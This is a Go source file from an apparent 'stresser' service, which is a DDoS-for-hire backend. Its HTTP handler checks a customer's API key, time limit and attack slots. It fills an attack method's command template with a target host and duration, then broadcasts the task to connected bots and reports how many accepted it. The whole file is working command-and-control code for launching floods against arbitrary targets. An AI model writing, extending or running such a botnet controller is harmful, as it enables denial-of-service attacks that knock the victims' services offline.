package main

import (
	"crypto/rand"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"log"
	"net/http"
	"time"

	"unstablestress/backend/arguments"
	"unstablestress/backend/internal/protocol"
)

type fetchServer struct {
	store  *Store
	slots  *slotManager
	hub    *hub
	prober *arguments.Prober
	logger *log.Logger
}

type acceptedTask struct {
	ID        string   `json:"id"`
	Key       string   `json:"key"`
	Method    string   `json:"method"`
	Host      string   `json:"host"`
	Scheme    string   `json:"scheme"`
	Time      int      `json:"time"`
	Argv      []string `json:"argv"`
	Bots      int      `json:"bots"`
	SlotsLeft int      `json:"slots_left"`
}

type problem struct {
	Error string `json:"error"`
}

func (s *fetchServer) handle(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodGet && r.Method != http.MethodPost {
		w.Header().Set("Allow", "GET, POST")
		writeProblem(w, http.StatusMethodNotAllowed, "only GET and POST are accepted")
		return
	}

	values := r.URL.Query()

	user, found := s.store.User(values.Get("key"))
	if !found {
		writeProblem(w, http.StatusUnauthorized, "key is not recognized")
		return
	}

	request, err := arguments.Parse(values, r.RemoteAddr, arguments.Limits{
		MaxSeconds: int(user.Time),
		AllowedIPs: user.IPWhitelist,
	})
	if err != nil {
		writeProblem(w, http.StatusBadRequest, "%s", err)
		return
	}

	if s.store.HostBlocked(request.Host.Hostname) {
		writeProblem(w, http.StatusForbidden, "host %s is blacklisted", request.Host.Hostname)
		return
	}

	method, found := s.store.Method(request.Method)
	if !found {
		writeProblem(w, http.StatusBadRequest, "method %s does not exist", request.Method)
		return
	}
	if !method.Status {
		writeProblem(w, http.StatusForbidden, "method %s is disabled", method.Name)
		return
	}

	if s.hub.count() == 0 {
		writeProblem(w, http.StatusServiceUnavailable, "no bot is connected")
		return
	}

	host := s.prober.Resolve(request.Host)

	argv, err := arguments.ParseCmdTemplate(method.Cmd, host.URL(), request.Seconds)
	if err != nil {
		s.logger.Printf("method %s has an unusable command: %v", method.Name, err)
		writeProblem(w, http.StatusInternalServerError, "method %s is misconfigured", method.Name)
		return
	}

	taskID := newTaskID()
	slotsLeft, err := s.slots.acquire(user.Key, taskID, time.Duration(request.Seconds)*time.Second, int(user.Slot))
	if err != nil {
		writeProblem(w, http.StatusTooManyRequests, "%s", err)
		return
	}

	delivered := s.hub.broadcast(protocol.Task{
		ID:     taskID,
		Key:    user.Key,
		Method: method.Name,
		Host:   host.URL(),
		Time:   request.Seconds,
		Argv:   argv,
	})
	if delivered == 0 {
		s.slots.release(user.Key, taskID)
		writeProblem(w, http.StatusServiceUnavailable, "every bot dropped the task, retry shortly")
		return
	}

	s.logger.Printf("task %s accepted key=%s method=%s host=%s time=%ds bots=%d slots_left=%d/%d client=%s argv=%q",
		taskID, user.Key, method.Name, host.URL(), request.Seconds, delivered,
		slotsLeft, int(user.Slot), request.ClientIP, argv)

	writeJSON(w, http.StatusOK, acceptedTask{
		ID:        taskID,
		Key:       user.Key,
		Method:    method.Name,
		Host:      host.URL(),
		Scheme:    host.Scheme,
		Time:      request.Seconds,
		Argv:      argv,
		Bots:      delivered,
		SlotsLeft: slotsLeft,
	})
}

func newTaskID() string {
	buffer := make([]byte, 8)
	if _, err := rand.Read(buffer); err != nil {
		return fmt.Sprintf("task-%d", time.Now().UnixNano())
	}
	return "task_" + hex.EncodeToString(buffer)
}

func writeJSON(w http.ResponseWriter, status int, payload any) {
	w.Header().Set("Content-Type", "application/json; charset=utf-8")
	w.WriteHeader(status)
	_ = json.NewEncoder(w).Encode(payload)
}

func writeProblem(w http.ResponseWriter, status int, format string, args ...any) {
	writeJSON(w, status, problem{Error: fmt.Sprintf(format, args...)})
}
